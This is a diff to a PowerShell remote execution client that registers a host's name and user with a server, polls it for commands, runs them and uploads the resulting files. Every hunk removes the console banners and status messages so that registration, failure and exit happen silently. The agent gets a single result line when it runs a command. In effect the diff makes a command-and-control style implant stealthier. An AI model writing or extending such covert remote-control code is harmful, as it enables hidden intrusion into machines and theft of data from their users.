@@ -15,16 +15,7 @@ $hash = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($inputString))
 $hashString = ($hash | ForEach {{ "{{0:x2}}" -f $_ }}) -join ''
 $stableId = $hashString.Substring(0, 12)
 
-# Display startup information
-Write-Host "==================================================================================" -ForegroundColor Cyan
-Write-Host "                         POWERSHELL EXECUTION UNIT                            " -ForegroundColor Cyan
-Write-Host "==================================================================================" -ForegroundColor Cyan
-Write-Host "  Stable ID   : $stableId" -ForegroundColor Green
-Write-Host "  Hostname    : $hostname" -ForegroundColor Green
-Write-Host "  Username    : $username" -ForegroundColor Green
-Write-Host "  Server URL  : $serverUrl" -ForegroundColor Green
-Write-Host "==================================================================================" -ForegroundColor Cyan
-Write-Host ""
+# Execution unit runs silently unless executing commands
 
 # File upload helper function using .NET HttpClient for proper multipart handling
 function Upload-ResultFiles {{
@@ -104,35 +95,17 @@ function Find-OutputFiles {{
     return $outputFiles
 }}
 
-# Register client to server and get stable ID
-Write-Host "Registering client to server..." -ForegroundColor Yellow
+# Register client to server silently
 try {{
     $registerData = @{{
         client_id = $stableId
         hostname = $hostname
         username = $username
     }} | ConvertTo-Json -Compress
-    
-    $registerResult = Invoke-RestMethod -Uri "$serverUrl/register_client" -Method POST -Body $registerData -ContentType "application/json" -UseBasicParsing
-    $registeredStableId = $registerResult.stable_id
-    $clientStatus = $registerResult.client_info
-    
-    Write-Host "==================================================================================" -ForegroundColor Green
-    Write-Host "                         CLIENT REGISTRATION SUCCESSFUL                          " -ForegroundColor Green
-    Write-Host "==================================================================================" -ForegroundColor Green
-    Write-Host "  Stable ID   : $registeredStableId                                           " -ForegroundColor Green
-    Write-Host "  Status      : $($clientStatus.status)                                                        " -ForegroundColor Green
-    Write-Host "  First Seen  : $(Get-Date $([DateTimeOffset]::FromUnixTimeSeconds($clientStatus.first_seen)).DateTime -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Green
-    Write-Host "==================================================================================" -ForegroundColor Green
-    Write-Host ""
+
+    Invoke-RestMethod -Uri "$serverUrl/register_client" -Method POST -Body $registerData -ContentType "application/json" -UseBasicParsing | Out-Null
 }} catch {{
-    Write-Host "==================================================================================" -ForegroundColor Red
-    Write-Host "                         CLIENT REGISTRATION FAILED                              " -ForegroundColor Red
-    Write-Host "==================================================================================" -ForegroundColor Red
-    Write-Host "  Error       : $($_.Exception.Message)                                      " -ForegroundColor Red
-    Write-Host "  Using local Stable ID: $stableId                                          " -ForegroundColor Yellow
-    Write-Host "==================================================================================" -ForegroundColor Red
-    Write-Host ""
+    # Registration failed, continue with local stable ID
 }}
 
 # Main execution: wait for one command or timeout after 10 seconds
@@ -146,10 +119,7 @@ while ($elapsed -lt $timeout -and -not $commandExecuted) {{
 
         if ($response.command) {{
             $commandId = $response.command_id
-            Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Yellow
-            Write-Host " [$stableId] Executing: $($response.command)" -ForegroundColor Yellow
-            if ($commandId) {{ Write-Host " Command ID: $commandId" -ForegroundColor Yellow }}
-            Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Yellow
+            Write-Host "[$stableId] Executing: $($response.command)" -ForegroundColor Yellow
 
             # Get files before execution for comparison
             $beforeFiles = Find-OutputFiles -Command $response.command
@@ -162,10 +132,8 @@ while ($elapsed -lt $timeout -and -not $commandExecuted) {{
                 $status = "failed"
             }}
 
-            Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Magenta
-            Write-Host " [$stableId] Result:" -ForegroundColor Magenta
+            Write-Host "[$stableId] Result:" -ForegroundColor Magenta
             $result.Split("`n") | ForEach {{ if ($_ -ne "") {{ Write-Host " $_" -ForegroundColor White }} }}
-            Write-Host "--------------------------------------------------------------------------------" -ForegroundColor Magenta
             Write-Host ""
 
             # Find new output files
@@ -210,7 +178,7 @@ while ($elapsed -lt $timeout -and -not $commandExecuted) {{
             }}
 
             $commandExecuted = $true
-            Write-Host "[$stableId] Command executed, exiting..." -ForegroundColor Green
+            Write-Host "[$stableId] Command completed" -ForegroundColor Green
         }} else {{
             Start-Sleep -Seconds 1
             $elapsed++
@@ -222,6 +190,4 @@ while ($elapsed -lt $timeout -and -not $commandExecuted) {{
     }}
 }}
 
-if (-not $commandExecuted) {{
-    Write-Host "[$stableId] No command received within $timeout seconds, exiting..." -ForegroundColor Yellow
-}}
+# Silently exit if no command was received
